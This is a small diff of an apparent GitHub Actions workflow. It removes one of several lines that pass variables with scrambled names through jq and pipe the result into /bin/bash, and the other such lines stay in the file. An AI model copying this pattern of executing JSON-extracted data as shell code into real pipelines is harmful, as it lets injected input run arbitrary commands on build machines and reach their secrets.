@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ex93" | jq -r .jhoea1 | /bin/bash
           printf '%s' "$of4" | jq -r .ksq961 | /bin/bash
           printf '%s' "$qyhy3863" | jq -r .xioay1841 | /bin/bash
-          echo $etwlv4208 | jq -r .dush15194 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
